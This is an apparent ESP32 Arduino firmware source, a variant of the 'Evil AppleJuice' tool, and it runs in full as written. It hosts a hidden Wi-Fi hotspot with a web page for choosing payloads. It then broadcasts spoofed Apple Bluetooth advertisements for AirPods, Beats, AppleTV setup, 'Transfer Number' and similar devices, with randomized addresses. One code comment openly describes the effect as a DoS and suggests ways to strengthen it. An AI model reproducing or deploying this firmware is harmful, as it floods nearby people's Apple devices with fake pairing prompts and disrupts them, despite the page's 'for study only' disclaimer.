#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>

#include <WiFi.h>
#include <WebServer.h>

int attack_state = 1;

int device_choice = 1;
int device_index = 8;
BLEAdvertising *pAdvertising;  // global variable
uint32_t delayMilliseconds = 500;

const uint8_t DEVICES[][31] = {
  // Airpods
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Max
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Gen 2
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Gen 3
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Pro Gen 2
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Power Beats
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Power Beats Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Solo Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio Buds
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Flex
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats X
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Solo 3
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio 3
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Betas Fit Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio Buds Plus
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
};

/*
  These are more general home devices
  It seems these can work over long distances, especially AppleTV Setup
*/
const uint8_t SHORT_DEVICES[][23] = {
  // AppleTV Setup
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV Pair
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV New User
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV AppleID Setup
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV Wireless Audio Sync
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV Homekit Setup
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV Keyboard Setup
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV Connecting to Network
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // Homepod Setup
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // Setup New Phone
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // Transfer Number
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // TV Color Balance
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
};

const char* ssid = "TP-LINK_1919810"; // WiFi热点名称
const char* password = "1145141919810"; // WiFi热点密码

IPAddress AP_local_ip(10,114,51,4);          //访问WEB后台的地址
IPAddress AP_gateway(10,114,51,4);           
IPAddress AP_subnet(255,255,255,0);       
WebServer server(80);

void setup() {
  Serial.begin(115200);
  WiFi.softAPConfig(AP_local_ip, AP_gateway, AP_subnet);
  //打开热点 WiFi.softAP(WIFI名字,WIFI密码,信道,1为隐藏SSID 0不隐藏,最大连接数)
  WiFi.softAP(ssid, password,1,1,2);
  server.on("/", handleRoot);
  server.on("/AttackOFF", AttackOFF);
  server.on("/Radom_Attack", Radom_Attack);
  server.on("/Extended_Attack", Extended_Attack);
  server.on("/Airpods", Airpods);
  server.on("/Airpods_pro", Airpods_pro);
  server.on("/Airpods_Max", Airpods_Max);
  server.on("/Airpods_Gen_2", Airpods_Gen_2);
  server.on("/Airpods_Gen_3", Airpods_Gen_3);
  server.on("/Airpods_Pro_Gen_2", Airpods_Pro_Gen_2);
  server.on("/Power_Beats", Power_Beats);
  server.on("/Power_Beats_Pro", Power_Beats_Pro);
  server.on("/Beats_Solo_Pro", Beats_Solo_Pro);
  server.on("/Beats_Studio_Buds", Beats_Studio_Buds);
  server.on("/Beats_Flex",Beats_Flex);
  server.on("/Beats_X", Beats_X);
  server.on("/Beats_Solo_3", Beats_Solo_3);
  server.on("/Beats_Studio_3", Beats_Studio_3);
  server.on("/Beats_Studio_Pro", Beats_Studio_Pro);
  server.on("/Betas_Fit_Pro", Betas_Fit_Pro);
  server.on("/Beats_Studio_Buds_Plus", Beats_Studio_Buds_Plus);
  server.on("/AppleTV_Setup", AppleTV_Setup);
  server.on("/AppleTV_Pair", AppleTV_Pair);
  server.on("/AppleTV_New_User", AppleTV_New_User);
  server.on("/AppleTV_AppleID_Setup", AppleTV_AppleID_Setup);
  server.on("/AppleTV_Wireless_Audio_Sync", AppleTV_Wireless_Audio_Sync);
  server.on("/AppleTV_Homekit_Setup", AppleTV_Homekit_Setup);
  server.on("/AppleTV_Keyboard_Setup", AppleTV_Keyboard_Setup);
  server.on("/AppleTV_Connecting_to_Network", AppleTV_Connecting_to_Network);
  server.on("/Homepod_Setup", Homepod_Setup);
  server.on("/Setup_New_Phone", Setup_New_Phone);
  server.on("/Transfer_Number", Transfer_Number);
  server.on("/TV_Color_Balance", TV_Color_Balance);
  server.begin();
  Serial.println("Web服务准备就绪");

  BLEDevice::init("AirPods 69");
  // Create the BLE Server
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  // seems we need to init it with an address in setup() step.
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
  Serial.println("蓝牙准备就绪");
}

void loop() {
  server.handleClient();
  if (attack_state == 1){
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++){
      dummy_addr[i] = random(256);

        // It seems for some reason first 4 bits
        // Need to be high (aka 0b1111), so we 
        // OR with 0xF0
      if (i == 0){
         dummy_addr[i] |= 0xF0;
      }
    }

   BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // Randomly pick data from one of the devices
  // First decide short or long
  // 0 = long (headphones), 1 = short (misc stuff like Apple TV)

  if (device_choice == 0){
    oAdvertisementData.addData(std::string((char*)DEVICES[device_index], 31));
  }
  else if(device_choice == 1){
    oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[device_index], 23));
  }
  else if(device_choice == 2){
    int payload_choice = random(2);
    if (payload_choice == 0){
      int index = random(17);
      oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
    }
    else {
      int index = random(12);
      oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
    }
  }
  else if(device_choice == 3){
    int payload_choice = random(2);
    if (payload_choice == 0){
      oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[2], 23));
    }
    else {
      oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[8], 23));
    }
  }




  int adv_type_choice = random(3);
  if (adv_type_choice == 0){
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1){
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }


  // Set the device address, advertisement data
  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);

  // Set advertising interval
  /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
      an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.
      
      These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
  */

  //pAdvertising->setMinInterval(0x20);
  //pAdvertising->setMaxInterval(0x20);
  //pAdvertising->setMinPreferred(0x20);
  //pAdvertising->setMaxPreferred(0x20);

  //Start advertising
  
  pAdvertising->start();
  delay(delayMilliseconds); // delay for delayMilliseconds ms
  pAdvertising->stop();
  
  }
}

void handleRoot() {
String html = R"(
<!DOCTYPE html>
<html>
<head>
<title>Evil AppleJuice Payload Web Selector</title>
</head>
<body>
<fieldset>
<form id='payload' action='/' method='get' onsubmit='return goToSelectedDirectory()'>
  <label for='options'>选择要使用的Payload</label>
  <select id='options' name='options'>
    <option value='AttackOFF'>关闭负载测试</option>
    <option value='Radom_Attack'>混合载荷测试</option>
    <option value='Extended_Attack'>泛用载荷测试</option>
    <option value='Airpods'>Airpods</option>
    <option value='Airpods_pro'>Airpods pro</option>
    <option value='Airpods_Max'>Airpods Max</option>
    <option value='Airpods_Gen_2'>Airpods Gen 2</option>
    <option value='Airpods_Gen_3'>Airpods Gen 3</option>
    <option value='Airpods_Pro_Gen_2'>Airpods Pro Gen 2</option>
    <option value='Power_Beats'>Power Beats</option>
    <option value='Power_Beats_Pro'>Power Beats Pro</option>
    <option value='Beats_Solo_Pro'>Beats Solo Pro</option>
    <option value='Beats_Studio_Buds'>Beats Studio Buds</option>
    <option value='Beats_Flex'>Beats Flex</option>
    <option value='Beats_X'>Beats X</option>
    <option value='Beats_Solo_3'>Beats Solo 3</option>
    <option value='Beats_Studio_3'>Beats Studio 3</option>
    <option value='Beats_Studio_Pro'>Beats Studio Pro</option>
    <option value='Betas_Fit_Pro'>Betas Fit Pro</option>
    <option value='Beats_Studio_Buds_Plus'>Beats Studio Buds Plus</option>
    <option value='AppleTV_Setup'>AppleTV Setup</option>
    <option value='AppleTV_Pair'>AppleTV Pair</option>
    <option value='AppleTV_New_User'>AppleTV New User</option>
    <option value='AppleTV_AppleID_Setup'>AppleTV AppleID Setup</option>
    <option value='AppleTV_Wireless_Audio_Sync'>AppleTV Wireless Audio Sync</option>
    <option value='AppleTV_Homekit_Setup'>AppleTV Homekit Setup</option>
    <option value='AppleTV_Keyboard_Setup'>AppleTV Keyboard Setup</option>
    <option value='AppleTV_Connecting_to_Network'>AppleTV Connecting to Network</option>
    <option value='Homepod_Setup'>Homepod Setup</option>
    <option value='Setup_New_Phone'>Setup New Phone</option>
    <option value='Transfer_Number'>Transfer Number</option>
    <option value='TV_Color_Balance'>TV Color Balance</option>
  </select>
  <input type='submit' value='提交至ESP32'>
</form>
</fieldset>
<script>
  function goToSelectedDirectory() {
    var selectedOption = document.getElementById('options').value;
    if (selectedOption === 'AttackOFF') {
      document.getElementById('payload').action = '/AttackOFF';
    }
    else if (selectedOption === 'Radom_Attack') {
      document.getElementById('payload').action = '/Radom_Attack';
    } 
    
    else if (selectedOption === 'Extended_Attack') {
      document.getElementById('payload').action = '/Extended_Attack';
    } 
    else if (selectedOption === 'Airpods') {
      document.getElementById('payload').action = '/Airpods';
    } 
    else if (selectedOption === 'Airpods_pro') {
      document.getElementById('payload').action = '/Airpods_pro';
    }
    else if (selectedOption === 'Airpods_Max') {
      document.getElementById('payload').action = '/Airpods_Max';
    }
    else if (selectedOption === 'Airpods_Gen_2') {
      document.getElementById('payload').action = '/Airpods_Gen_2';
    }
    else if (selectedOption === 'Airpods_Gen_3') {
      document.getElementById('payload').action = '/Airpods_Gen_3';
    }
    else if (selectedOption === 'Airpods_Pro_Gen_2') {
      document.getElementById('payload').action = '/Airpods_Pro_Gen_2';
    }
    else if (selectedOption === 'Power_Beats') {
      document.getElementById('payload').action = '/Power_Beats';
    }
    else if (selectedOption === 'Power_Beats_Pro') {
      document.getElementById('payload').action = '/Power_Beats_Pro';
    }
    else if (selectedOption === 'Beats_Solo_Pro') {
      document.getElementById('payload').action = '/Beats_Solo_Pro';
    }
    else if (selectedOption === 'Beats_Studio_Buds') {
      document.getElementById('payload').action = '/Beats_Studio_Buds';
    }
    else if (selectedOption === 'Beats_Flex') {
      document.getElementById('payload').action = '/Beats_Flex';
    }
    else if (selectedOption === 'Beats_X') {
      document.getElementById('payload').action = '/Beats_X';
    }
    else if (selectedOption === 'Beats_Solo_3') {
      document.getElementById('payload').action = '/Beats_Solo_3';
    }
    else if (selectedOption === 'Beats_Studio_Pro') {
      document.getElementById('payload').action = '/Beats_Studio_Pro';
    }
    else if (selectedOption === 'Betas_Fit_Pro') {
      document.getElementById('payload').action = '/Betas_Fit_Pro';
    }
    else if (selectedOption === 'Beats_Studio_Buds_Plus') {
      document.getElementById('payload').action = '/Beats_Studio_Buds_Plus';
    }
    else if (selectedOption === 'AppleTV_Setup') {
      document.getElementById('payload').action = '/AppleTV_Setup';
    }
    else if (selectedOption === 'AppleTV_Pair') {
      document.getElementById('payload').action = '/AppleTV_Pair';
    }
    else if (selectedOption === 'AppleTV_New_User') {
      document.getElementById('payload').action = '/AppleTV_New_User';
    }
    else if (selectedOption === 'AppleTV_AppleID_Setup') {
      document.getElementById('payload').action = '/AppleTV_AppleID_Setup';
    }
    else if (selectedOption === 'AppleTV_Wireless_Audio_Sync') {
      document.getElementById('payload').action = '/AppleTV_Wireless_Audio_Sync';
    }
    else if (selectedOption === 'AppleTV_Homekit_Setup') {
      document.getElementById('payload').action = '/AppleTV_Homekit_Setup';
    }
    else if (selectedOption === 'AppleTV_Keyboard_Setup') {
      document.getElementById('payload').action = '/AppleTV_Keyboard_Setup';
    }
    else if (selectedOption === 'AppleTV_Connecting_to_Network') {
      document.getElementById('payload').action = '/AppleTV_Connecting_to_Network';
    }
    else if (selectedOption === 'Homepod_Setup') {
      document.getElementById('payload').action = '/Homepod_Setup';
    }
    else if (selectedOption === 'Setup_New_Phone') {
      document.getElementById('payload').action = '/Setup_New_Phone';
    }
    else if (selectedOption === 'Transfer_Number') {
      document.getElementById('payload').action = '/Transfer_Number';
    }
    else if (selectedOption === 'TV_Color_Balance') {
      document.getElementById('payload').action = '/TV_Color_Balance';
    }
    return true;
  }
</script>
<h6>本固件仅用于学习交流使用，使用者所造成的一切后果与作者无关</h6>
<h6>By Akagi_cv</h6>
</body>
</html>
)";

  server.send(200, "text/html", html);
}


void AttackOFF(){
  attack_state = 0;
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已关闭负载测试</h3><a href='/'><button>返回Payload选择页面</button></a>");
}

void Radom_Attack(){
  device_choice = 2;
  attack_state = 1;
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已启用混合负载测试</h3><a href='/'><button>返回Payload选择页面</button></a>");
}

void Extended_Attack(){
  device_choice = 3;
  attack_state = 1;
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已启用泛用负载测试</h3><a href='/'><button>返回Payload选择页面</button></a>");
}


void Airpods() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Airpods作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 0;
  device_index = 0;
  attack_state = 1;
}

void Airpods_pro() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Airpods pro作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 0;
  device_index = 1;
  attack_state = 1;
}

void Airpods_Max() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Airpods Max作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 0;
  device_index = 2;
  attack_state = 1;
}

void Airpods_Gen_2() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Airpods Gen 2作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 0;
  device_index = 3;
  attack_state = 1;
}

void Airpods_Gen_3() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Airpods Gen 3作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 0;
  device_index = 4;
  attack_state = 1;
}

void Airpods_Pro_Gen_2() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Airpods Pro Gen 2作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 0;
  device_index = 5;
  attack_state = 1;
}

void Power_Beats() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Power Beats作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 0;
  device_index = 6;
  attack_state = 1;
}

void Power_Beats_Pro() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Power Beats Pro作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 0;
  device_index = 7;
  attack_state = 1;
}

void Beats_Solo_Pro() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Beats Solo Pro作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 0;
  device_index = 8;
  attack_state = 1;
}

void Beats_Studio_Buds() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Beats Studio Buds作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 0;
  device_index = 9;
  attack_state = 1;
}

void Beats_Flex() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Beats Flex作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 0;
  device_index = 10;
  attack_state = 1;
}

void Beats_X() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Beats X作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 0;
  device_index = 11;
  attack_state = 1;
}

void Beats_Solo_3() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Beats Solo 3作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 0;
  device_index = 12;
  attack_state = 1;
}

void Beats_Studio_3() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Beats Studio 3作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 0;
  device_index = 13;
  attack_state = 1;
}

void Beats_Studio_Pro() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Beats Studio Pro作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 0;
  device_index = 14;
  attack_state = 1;
}

void Betas_Fit_Pro() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Betas Fit Pro作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 0;
  device_index = 15;
}

void Beats_Studio_Buds_Plus() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Beats Studio Buds Plus作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 0;
  device_index = 16;
  attack_state = 1;
}

void AppleTV_Setup() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择AppleTV Setup作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 1;
  device_index = 0;
  attack_state = 1;
}

void AppleTV_Pair() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择AppleTV Pair作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 1;
  device_index = 1;
  attack_state = 1;
}

void AppleTV_New_User() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择AppleTV New User作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 1;
  device_index = 2;
  attack_state = 1;
}

void AppleTV_AppleID_Setup() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择AppleTV AppleID Setup作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 1;
  device_index = 3;
  attack_state = 1;
}

void AppleTV_Wireless_Audio_Sync() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择AppleTV Wireless Audio Sync作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 1;
  device_index = 4;
  attack_state = 1;
}

void AppleTV_Homekit_Setup() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择AppleTV Homekit Setup作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 1;
  device_index = 5;
  attack_state = 1;
}

void AppleTV_Keyboard_Setup() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择AppleTV Keyboard Setup作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 1;
  device_index = 6;
  attack_state = 1;
}

void AppleTV_Connecting_to_Network() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择AppleTV Connecting to Network作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 1;
  device_index = 7;
  attack_state = 1;
}

void Homepod_Setup() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Homepod Setup作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 1;
  device_index = 8;
  attack_state = 1;
}

void Setup_New_Phone() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Setup New Phone作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 1;
  device_index = 9;
  attack_state = 1;
}

void Transfer_Number() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择Transfer Number作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 1;
  device_index = 10;
  attack_state = 1;
}

void TV_Color_Balance() {
  server.send(200, "text/html", "<title>AppleJuice Payload Web Selector</title><h3>已选择TV Color Balance作为Payload</h3><a href='/'><button>返回Payload选择页面</button></a>");
  device_choice = 1;
  device_index = 11;
  attack_state = 1;
}